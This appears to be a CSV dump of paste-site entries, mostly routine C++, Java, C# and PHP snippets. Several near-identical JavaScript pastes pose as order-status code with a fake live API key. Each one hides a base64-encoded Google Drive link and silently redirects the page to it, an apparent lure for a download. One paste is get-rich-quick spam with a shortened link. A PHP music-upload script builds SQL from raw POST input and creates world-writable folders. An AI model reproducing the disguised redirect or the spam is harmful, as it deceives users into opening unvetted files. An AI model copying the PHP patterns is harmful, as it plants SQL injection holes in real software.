id,title,username,language,date,content
eubttTeM,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:22:00 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x < 1) {
        return;
    }
    cout << x << "" "";
    print(x - 1);
}
int main() {
    print(5);
    
    return 0;
}
// print(5)
"
gvDHmbwZ,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:18:33 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 100) {
        return;
    }
    
    cout << x << endl;
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1)
// print(2)
// print(3)
// print(4)
// print(5)
// print(6)
"
svZiWM4d,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:16:41 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 5) {
        return;
    }
    
    cout << x << endl;
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1)
// print(2)
// print(3)
// print(4)
// print(5)
// print(6)
"
ViWWfjVv,Make $1000 15-MINUTES (BEGINNER) FM,OffbrandShrek,JavaScript,Sunday 13th of April 2025 06:13:01 AM CDT," 
Pdf https://tinyurl.com/privguidee


WSlfQGBr6D
"
QbgijkJY,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:12:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10919/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CmADwkL4,dataNone,TestGuy1,JSON,Sunday 13th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '1a12b2ed20cae7a3264d0739898f03e8eabb18ea7d4a4fa1f532e1a4842db5f4ac1b4a0dbe267067e8bcb588af19be761c19a6fa13099a94e8c0269f9b9931580215a29bf0fa7bc6d9a31a8513782d8067c490bb81086228e600d23f22b06868891200e7c09959b5f263c9e192ab10e4d4be5712350b13635c382c07856b91bd',
  otherdata: [
    '149efc3674c9d38776dd80d0235ba104',
    '312dc2f505d513d4e0a326b0fc2ce37c',
    '20133546866cfe6b1bde28e8de861084',
    '0826de8d0954c54833cbe5bf02a8fb9a',
    '8fbd5633ab728be7bc70bebb1aa03916',
    '0c331001678747d73a065c6502fdbf90',
    '66ea9de7d2674f470a3f8a71a2bda38a',
    'b48bf95b4290bf15582f9057b2d0b596'
  ]
}"
PU7B7uUT,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:57:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hMWRyeD5,Untitled,Feynom,C#,Sunday 13th of April 2025 05:54:59 AM CDT,"using Cysharp.Threading.Tasks;
using UnityEngine;
using UnityEngine.AddressableAssets;

public class AddressablesTest : MonoBehaviour
{
    [Header(""Preferences"")]
    [SerializeField] private AssetReferenceGameObject _assetReferenceGameObject;

    private GameObject _instance;

    private async void Instantiate()
    {
        if (_instance != null)
            return;

        _instance = await Addressables.InstantiateAsync(_assetReferenceGameObject);
    }

    private void DestroyInstance()
    {
        if (_instance == null)
            return;

        Addressables.ReleaseInstance(_instance);
        _instance = null;
    }

    private void OnGUI()
    {
        if (GUILayout.Button(""Instantiate""))
            Instantiate();

        if (GUILayout.Button(""Destroy Instance""))
            DestroyInstance();

        if (GUILayout.Button(""Unload Unused Assets""))
            Resources.UnloadUnusedAssets();
    }
}"
VaEC8WeB,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:41:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34433/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z1LDQmjY,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:26:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29269/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
duN9aAqf,[NP] Line Processor,dzocesrce,Java,Sunday 13th of April 2025 05:18:20 AM CDT,"import java.io.*;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

class LineProcessor {

    List<String> lines;

    public LineProcessor() {
        lines= new ArrayList<>();
    }

    public int countOcc(String line, char c){
        int total=0;
        for(char l : line.toCharArray()){
            if(l==c)
                total++;
        }
        return total;
    }


    public void readLines(InputStream in, PrintStream out, char a) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        lines = bufferedReader.lines().map(i-> i.toLowerCase()).collect(Collectors.toList());

        Comparator<String> comparator = Comparator.comparing(str->countOcc(str,a));

        PrintWriter printWriter = new PrintWriter(out);

        String max = lines.stream().max(comparator.thenComparing(Comparator.naturalOrder())).get();
        printWriter.println(max);
        printWriter.flush();

    }
}

public class LineProcessorTest {

    public static void main(String[] args) {
        LineProcessor lineProcessor = new LineProcessor();


        lineProcessor.readLines(System.in, System.out, 'a');
    }
}
"
n6hzkrd7,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:11:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21145/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kBaFhrn4,tracks,vitnet,PHP,Sunday 13th of April 2025 05:03:28 AM CDT,"
    // Обработка xfields
    $xfieldsid = $added_time;
    $xfieldsaction = ""init"";
    include ENGINE_DIR . '/inc/xfields.php';

    // Загрузка MP3 файла
    $mp3Data = handleFileUpload(
        'f_music',
        'files/mp3/tracks/',
        ['mp3'],
        $config['max_file_size'],
        $title,
        $added_time
    );
    
    if (!$mp3Data['success']) {
        msg(""error"", $lang['addnews_error'], $mp3Data['message'], ""javascript:history.go(-1)"");
    }

    // Загрузка обложки
    $coverData = handleFileUpload(
        'cv_music',
        'files/cover/tracks/',
        ['jpg'],
        $config['max_file_size'],
        $title,
        $added_time
    );
    
    if (!$coverData['success']) {
        msg(""error"", $lang['addnews_error'], $coverData['message'], ""javascript:history.go(-1)"");
    }

    // Получение информации о MP3
    if (!empty($mp3Data['file_path'])) {
        include ENGINE_DIR . '/classes/muz/id3v2.class.php';
        $audio = new id3v2();
        $audio->GetInfo($mp3Data['file_path']);
        $id3v1 = $audio->id3v1Info;
        $mpegInfo = $audio->mpegInfo;
        
        $muz_beats = $parse->remove($mpegInfo['Bitrate']);
        $muz_ggc = $parse->remove($mpegInfo['SamplingRate']);
        $muz_lenght = $parse->remove($mpegInfo['PlayTime']);
    }

    // Сохранение данных в базу
    saveToDatabase(
        $member_id,
        $title,
        $short_story,
        $full_story,
        $filecontents,
        $metatags,
        $alt_name,
        $allow_comm,
        $approve,
        $allow_main,
        $news_fixed,
        $allow_br,
        $catalog_url,
        $allow_rating,
        $add_vote,
        $disable_index,
        $group_regel,
        $vote_title,
        $frage,
        $vote_body,
        $allow_m_vote,
        $expires,
        $expires_action,
        $mp3Data,
        $coverData,
        $muz_beats,
        $muz_ggc,
        $muz_lenght,
        $muz_file_cat
    );

    // Логирование и очистка кеша
    $db->query(""INSERT INTO "" . USERPREFIX . ""_admin_logs (name, date, ip, action, extras) VALUES ('"" . $db->safesql($member_id['name']) . ""', '{$_TIME}', '{$_IP}', '1', '{$title}')"");
    clear_cache(['news_', 'related_', 'tagscloud_', 'archives_', 'calendar_', 'topnews_', 'rss']);

    msg(""info"", $lang['addnews_ok'], $lang['addnews_ok_1'] . "" \"""" . stripslashes(stripslashes($title)) . ""\"" "" . $lang['addnews_ok_2']);

/**
 * Обрабатывает загрузку файла на сервер
 */
function handleFileUpload($fieldName, $targetDir, $allowedTypes, $maxSizeMb, $title, $added_time) {
    global $parse;
    
    $result = [
        'success' => false,
        'message' => '',
        'file_name' => '',
        'file_path' => '',
        'file_size' => 0
    ];

    if (empty($title)) {
        $result['message'] = 'Заполните поле ""Название""';
        return $result;
    }

    if (!isset($_FILES[$fieldName]) || $_FILES[$fieldName]['error'] !== UPLOAD_ERR_OK) {
        $result['message'] = 'Файл не был загружен';
        return $result;
    }

    // Проверка и создание директории
    if (!is_dir(ROOT_DIR . ""/"" . $targetDir)) {
        @mkdir(ROOT_DIR . ""/"" . $targetDir, 0777, true);
        @chmod(ROOT_DIR . ""/"" . $targetDir, 0777);
    }

    $fileName = $_FILES[$fieldName]['name'];
    $fileParts = explode('.', $fileName);
    $fileExt = strtolower(end($fileParts));

    if (!in_array($fileExt, $allowedTypes)) {
        $result['message'] = 'Недопустимый формат файла. Разрешены: ' . implode(', ', $allowedTypes);
        return $result;
    }

    // Проверка размера файла
    $fileSizeKb = filesize($_FILES[$fieldName]['tmp_name']) / 1024;
    $maxSizeKb = $maxSizeMb * 1024;
    
    if ($fileSizeKb > $maxSizeKb) {
        $result['message'] = ""Размер файла превышает {$maxSizeMb} Mb"";
        return $result;
    }

    // Генерация имени файла
    $translitName = totranslit($title);
    $newFileName = $added_time . ""-"" . $translitName . '.' . $fileExt;
    $fullFilePath = ROOT_DIR . '/' . $targetDir . $newFileName;

    if (!@move_uploaded_file($_FILES[$fieldName]['tmp_name'], $fullFilePath)) {
        $result['message'] = 'Ошибка при сохранении файла';
        return $result;
    }

    $result['success'] = true;
    $result['file_name'] = $newFileName;
    $result['file_path'] = $fullFilePath;
    $result['file_size'] = filesize($fullFilePath);
    
    return $result;
}

/**
 * Сохраняет все данные в базу данных
 */
function saveToDatabase(
    $member_id,
    $title,
    $short_story,
    $full_story,
    $filecontents,
    $metatags,
    $alt_name,
    $allow_comm,
    $approve,
    $allow_main,
    $news_fixed,
    $allow_br,
    $catalog_url,
    $allow_rating,
    $add_vote,
    $disable_index,
    $group_regel,
    $vote_title,
    $frage,
    $vote_body,
    $allow_m_vote,
    $expires,
    $expires_action,
    $mp3Data,
    $coverData,
    $muz_beats,
    $muz_ggc,
    $muz_lenght,
    $muz_file_cat
) {
    global $db, $thistime, $_TIME, $_IP, $_POST;

    // Основная запись новости
    $db->query(""INSERT INTO "" . PREFIX . ""_post (
        date, autor, short_story, full_story, xfields, title, descr, keywords, 
        alt_name, allow_comm, approve, allow_main, fixed, allow_br, symbol, tags, 
        metatitle, muz_ssilka, cover_ssilka, muz_razmer, muz_beats, muz_ggc, 
        muz_lenght, muz_dcount
    ) VALUES (
        '$thistime', '{$member_id['name']}', '$short_story', '$full_story', 
        '$filecontents', '$title', '{$metatags['description']}', '{$metatags['keywords']}', 
        '$alt_name', '$allow_comm', '$approve', '$allow_main', '$news_fixed', 
        '$allow_br', '$catalog_url', '{$_POST['tags']}', '{$metatags['title']}', 
        'tracks/{$mp3Data['file_name']}', 'tracks/{$coverData['file_name']}', 
        '{$mp3Data['file_size']}', '$muz_beats', '$muz_ggc', '$muz_lenght', '0'
    )"");

    $row = $db->insert_id();

    // Дополнительные данные новости
    $db->query(""INSERT INTO "" . PREFIX . ""_post_extras (
        news_id, allow_rate, votes, disable_index, access, user_id
    ) VALUES(
        '{$row}', '{$allow_rating}', '{$add_vote}', '{$disable_index}', 
        '{$group_regel}', '{$member_id['user_id']}'
    )"");

    // Голосование
    if ($add_vote) {
        $db->query(""INSERT INTO "" . PREFIX . ""_poll (
            news_id, title, frage, body, votes, multiple, answer
        ) VALUES(
            '{$row}', '$vote_title', '$frage', '$vote_body', 0, '$allow_m_vote', ''
        )"");
    }

    // Истекающие новости
    if ($expires) {
        $expires_action = intval($_POST['expires_action']);
        $db->query(""INSERT INTO "" . PREFIX . ""_post_log (
            news_id, expires, action
        ) VALUES(
            '{$row}', '$expires', '$expires_action'
        )"");
    }

    // Теги
    if (!empty($_POST['tags']) && $approve) {
        $tags = [];
        $_POST['tags'] = explode("","", $_POST['tags']);

        foreach ($_POST['tags'] as $value) {
            $tags[] = ""('"" . $row . ""', '"" . trim($value) . ""')"";
        }

        $tags = implode("", "", $tags);
        $db->query(""INSERT INTO "" . PREFIX . ""_tags (news_id, tag) VALUES "" . $tags);
    }

    // Файлы
    if (!empty($mp3Data['file_name'])) {
        $db->query(""INSERT INTO "" . PREFIX . ""_files (
            news_id, name, onserver, author, date, muz_razmer
        ) VALUES (
            '{$row}', '"" . $title . "" [BeatBass.Ru].mp3', 
            '{$muz_file_cat['alt_name']}/{$mp3Data['file_name']}', 
            '"" . $member_id['name'] . ""', '"" . time() . ""', 
            '{$mp3Data['file_size']}'
        )"");
    }

    // Обложки
    if (!empty($coverData['file_name'])) {
        $db->query(""INSERT INTO "" . PREFIX . ""_cover (
            news_id, onserver
        ) VALUES (
            '{$row}', '{$muz_file_cat['alt_name']}/{$coverData['file_name']}'
        )"");
    }

    return $row;
}"
